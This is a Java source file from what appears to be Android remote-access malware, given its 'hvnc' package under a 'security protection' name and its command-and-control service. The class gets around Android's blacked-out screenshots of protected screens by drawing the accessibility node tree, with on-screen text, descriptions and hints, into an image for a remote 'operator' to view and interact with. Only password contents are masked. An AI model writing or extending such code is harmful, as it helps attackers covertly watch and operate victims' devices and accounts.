package com.seguranca.protecao.hvnc;

import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Rect;
import android.graphics.RectF;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.List;

/**
 * NodeTreeRenderer
 *
 * When AccessibilityService.takeScreenshot() returns a black or near-black frame
 * (Android intentionally blacks password fields), this renderer walks the full
 * accessibility node tree and paints a composite UI map the operator can still
 * interact with. Every node is drawn as a labelled colored rect. Password fields
 * show bullet placeholders — NOT their contents.
 *
 * Usage (inside UiAssistBridge / CommandControlService):
 *
 *   NodeTreeRenderer renderer = new NodeTreeRenderer(screenW, screenH, captureW, captureH);
 *   Bitmap fallback = renderer.render(getRootInActiveWindow());
 *   if (fallback != null) sendBitmapFrame(fallback);
 *
 * Thread-safety: render() may be called from any thread. Internal Paint objects
 * are allocated per-call to avoid cross-thread sharing.
 */
public final class NodeTreeRenderer {

    // ── Thresholds ─────────────────────────────────────────────────────────────
    /** Fraction of pixels that must be near-black before we consider a frame "blacked out". */
    private static final float BLACK_THRESHOLD_RATIO = 0.85f;
    /** Luminance below this value is considered "black" (0-255). */
    private static final int   BLACK_LUMINANCE_MAX   = 12;
    /** Sample step: check 1 in N pixels to keep the CRC-like check fast. */
    private static final int   SAMPLE_STEP           = 8;

    // ── Layout ─────────────────────────────────────────────────────────────────
    private static final int BG_COLOR       = 0xFF0D0D1A;  // very dark navy
    private static final int GRID_COLOR     = 0xFF141428;
    private static final int STROKE_DEFAULT = 0xFF2A2A4A;

    // Node-type color map (ARGB)
    private static final int CLR_EDIT_TEXT     = 0xFF2979FF;  // blue
    private static final int CLR_PASSWORD      = 0xFFAA44CC;  // purple
    private static final int CLR_BUTTON        = 0xFF00C853;  // green
    private static final int CLR_IMAGE         = 0xFFFF6D00;  // orange
    private static final int CLR_TEXT_VIEW     = 0xFF90CAF9;  // light blue
    private static final int CLR_CHECKBOX      = 0xFF26C6DA;  // cyan
    private static final int CLR_LIST_ITEM     = 0xFF546E7A;  // grey-blue
    private static final int CLR_SCROLL_VIEW   = 0xFF37474F;  // dark grey
    private static final int CLR_GENERIC_CONT  = 0xFF1E2030;  // very dark (containers)
    private static final int CLR_ACTIONBAR     = 0xFF1A237E;  // deep blue (toolbars)
    private static final int CLR_UNKNOWN       = 0xFF263238;  // fallback

    // ── Coordinate mapping ──────────────────────────────────────────────────────
    private final int   screenW, screenH;
    private final int   captureW, captureH;
    private final float scaleX, scaleY;

    public NodeTreeRenderer(int screenW, int screenH, int captureW, int captureH) {
        this.screenW  = screenW;  this.screenH  = screenH;
        this.captureW = captureW; this.captureH = captureH;
        this.scaleX   = (float) captureW / screenW;
        this.scaleY   = (float) captureH / screenH;
    }

    // ── Public API ──────────────────────────────────────────────────────────────

    /**
     * Test whether a bitmap is "blacked out" (password field or intentional blackout).
     * Samples every SAMPLE_STEP-th pixel; O(N/SAMPLE_STEP) — ~0.3 ms on 360×720.
     */
    public static boolean isFrameBlackedOut(@NonNull Bitmap bmp) {
        final int w = bmp.getWidth(), h = bmp.getHeight();
        if (w == 0 || h == 0) return true;

        int total = 0, dark = 0;
        for (int y = 0; y < h; y += SAMPLE_STEP) {
            for (int x = 0; x < w; x += SAMPLE_STEP) {
                int px  = bmp.getPixel(x, y);
                int r   = (px >> 16) & 0xFF;
                int g   = (px >> 8)  & 0xFF;
                int b   =  px        & 0xFF;
                int lum = (r * 299 + g * 587 + b * 114) / 1000;
                if (lum <= BLACK_LUMINANCE_MAX) dark++;
                total++;
            }
        }
        return total > 0 && ((float) dark / total) >= BLACK_THRESHOLD_RATIO;
    }

    /**
     * Render the accessibility node tree for {@code root} into a new
     * {@code captureW × captureH} Bitmap. Returns null if the tree is empty
     * or if root is null.
     *
     * The returned bitmap must be recycled by the caller after encoding.
     */
    @Nullable
    public Bitmap render(@Nullable AccessibilityNodeInfo root) {
        if (root == null) return null;

        Bitmap   bmp    = Bitmap.createBitmap(captureW, captureH, Bitmap.Config.ARGB_8888);
        Canvas   canvas = new Canvas(bmp);
        Paint    fill   = new Paint(Paint.ANTI_ALIAS_FLAG);
        Paint    stroke = new Paint(Paint.ANTI_ALIAS_FLAG);
        Paint    text   = new Paint(Paint.ANTI_ALIAS_FLAG);
        Paint    grid   = new Paint();

        // Background
        canvas.drawColor(BG_COLOR);

        // Faint grid
        grid.setColor(GRID_COLOR);
        grid.setStrokeWidth(0.5f);
        grid.setStyle(Paint.Style.STROKE);
        for (int x = 0; x < captureW; x += 40) canvas.drawLine(x, 0, x, captureH, grid);
        for (int y = 0; y < captureH; y += 40) canvas.drawLine(0, y, captureW, y, grid);

        // Paint setup
        stroke.setStyle(Paint.Style.STROKE);
        stroke.setStrokeWidth(1.0f);
        text.setTextSize(10f);

        // Collect all nodes via BFS so we draw parents before children
        List<AccessibilityNodeInfo> nodes = collectNodes(root);

        for (AccessibilityNodeInfo node : nodes) {
            drawNode(canvas, node, fill, stroke, text);
        }

        // Watermark
        Paint wm = new Paint(Paint.ANTI_ALIAS_FLAG);
        wm.setColor(0x33FFFFFF);
        wm.setTextSize(9f);
        canvas.drawText("NODE-TREE  " + nodes.size() + " nodes", 4, captureH - 4, wm);

        // Recycle node infos
        for (AccessibilityNodeInfo n : nodes) n.recycle();

        return bmp;
    }

    // ── BFS node collector ──────────────────────────────────────────────────────

    private static List<AccessibilityNodeInfo> collectNodes(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo>  result = new ArrayList<>(128);
        ArrayDeque<AccessibilityNodeInfo> q = new ArrayDeque<>();
        q.add(root);

        while (!q.isEmpty()) {
            AccessibilityNodeInfo cur = q.poll();
            if (cur == null) continue;

            Rect b = new Rect();
            cur.getBoundsInScreen(b);
            if (!b.isEmpty()) result.add(cur);
            else              cur.recycle();  // skip zero-size, free immediately

            for (int i = 0; i < cur.getChildCount(); i++) {
                AccessibilityNodeInfo child = cur.getChild(i);
                if (child != null) q.add(child);
            }
        }
        return result;
    }

    // ── Node drawing ────────────────────────────────────────────────────────────

    private void drawNode(Canvas canvas,
                          AccessibilityNodeInfo node,
                          Paint fill, Paint stroke, Paint text) {
        Rect b = new Rect();
        node.getBoundsInScreen(b);

        // Map screen coords → capture coords
        float l = b.left   * scaleX;
        float t = b.top    * scaleY;
        float r = b.right  * scaleX;
        float bo = b.bottom * scaleY;

        if (l >= captureW || t >= captureH || r <= 0 || bo <= 0) return;

        RectF  rect       = new RectF(l, t, r, bo);
        String className  = classSimple(node.getClassName());
        boolean isPassword = node.isPassword();
        boolean isEditable = node.isEditable();
        boolean isClickable = node.isClickable();

        // Fill color by node type
        int fillColor  = resolveColor(className, isPassword, isEditable, isClickable);
        int alpha      = isLeaf(node) ? 0x55 : 0x22;  // leaf nodes more visible
        fill.setColor(fillColor);
        fill.setAlpha(alpha);
        fill.setStyle(Paint.Style.FILL);
        canvas.drawRoundRect(rect, 3f, 3f, fill);

        // Stroke
        stroke.setColor(isClickable ? fillColor : STROKE_DEFAULT);
        stroke.setAlpha(isClickable ? 0xCC : 0x44);
        canvas.drawRoundRect(rect, 3f, 3f, stroke);

        // Text label — only for visible leaf nodes or clickable containers
        if (rect.height() > 10 && (isLeaf(node) || isClickable)) {
            String label = buildLabel(node, isPassword, className);
            if (!label.isEmpty()) {
                text.setColor(fillColor);
                text.setAlpha(0xFF);
                // Clip text to rect width
                float maxW = rect.width() - 6f;
                if (maxW > 20f) {
                    String clipped = clipText(text, label, maxW);
                    canvas.drawText(clipped, l + 3f, Math.min(t + 12f, bo - 2f), text);
                }
            }
        }

        // Draw focus indicator
        if (node.isFocused() || node.isAccessibilityFocused()) {
            Paint focus = new Paint();
            focus.setStyle(Paint.Style.STROKE);
            focus.setStrokeWidth(2f);
            focus.setColor(0xFFFFFF00);
            focus.setAlpha(0xAA);
            canvas.drawRoundRect(rect, 3f, 3f, focus);
        }
    }

    // ── Helpers ─────────────────────────────────────────────────────────────────

    private static boolean isLeaf(AccessibilityNodeInfo n) {
        return n.getChildCount() == 0;
    }

    private static String classSimple(@Nullable CharSequence full) {
        if (full == null) return "";
        String s = full.toString();
        int dot = s.lastIndexOf('.');
        return dot >= 0 ? s.substring(dot + 1) : s;
    }

    private static int resolveColor(String cls, boolean isPassword,
                                    boolean isEditable, boolean isClickable) {
        if (isPassword) return CLR_PASSWORD;
        if (isEditable) return CLR_EDIT_TEXT;

        switch (cls) {
            case "EditText":         return CLR_EDIT_TEXT;
            case "Button":
            case "ImageButton":
            case "FloatingActionButton":
            case "MaterialButton":   return CLR_BUTTON;
            case "ImageView":        return CLR_IMAGE;
            case "TextView":         return CLR_TEXT_VIEW;
            case "CheckBox":
            case "RadioButton":
            case "Switch":
            case "ToggleButton":     return CLR_CHECKBOX;
            case "RecyclerView":
            case "ListView":
            case "GridView":         return CLR_LIST_ITEM;
            case "ScrollView":
            case "NestedScrollView": return CLR_SCROLL_VIEW;
            case "Toolbar":
            case "ActionBar":
            case "AppBarLayout":     return CLR_ACTIONBAR;
            case "LinearLayout":
            case "RelativeLayout":
            case "FrameLayout":
            case "ConstraintLayout":
            case "CoordinatorLayout":
            case "CardView":         return CLR_GENERIC_CONT;
        }
        if (isClickable) return CLR_BUTTON;
        return CLR_UNKNOWN;
    }

    @NonNull
    private static String buildLabel(AccessibilityNodeInfo node,
                                     boolean isPassword, String cls) {
        if (isPassword) {
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                // Show bullet placeholders, not actual content
                StringBuilder bullets = new StringBuilder();
                for (int i = 0; i < Math.min(text.length(), 12); i++) bullets.append('●');
                return "[PASS] " + bullets;
            }
            return "[PASSWORD FIELD]";
        }

        // Prefer visible text, then content description, then class name + hint
        CharSequence t  = node.getText();
        CharSequence cd = node.getContentDescription();
        CharSequence ht = node.getHintText();

        if (t  != null && t.length()  > 0) return t.toString();
        if (cd != null && cd.length() > 0) return "[" + cd + "]";
        if (ht != null && ht.length() > 0) return "⌨ " + ht;
        if (!cls.isEmpty())               return "<" + cls + ">";
        return "";
    }

    private static String clipText(Paint p, String s, float maxW) {
        if (p.measureText(s) <= maxW) return s;
        // Binary-search clip point
        int lo = 0, hi = s.length();
        while (lo < hi) {
            int mid = (lo + hi + 1) >> 1;
            if (p.measureText(s, 0, mid) + p.measureText("…") <= maxW) lo = mid;
            else hi = mid - 1;
        }
        return lo > 0 ? s.substring(0, lo) + "…" : "…";
    }
}
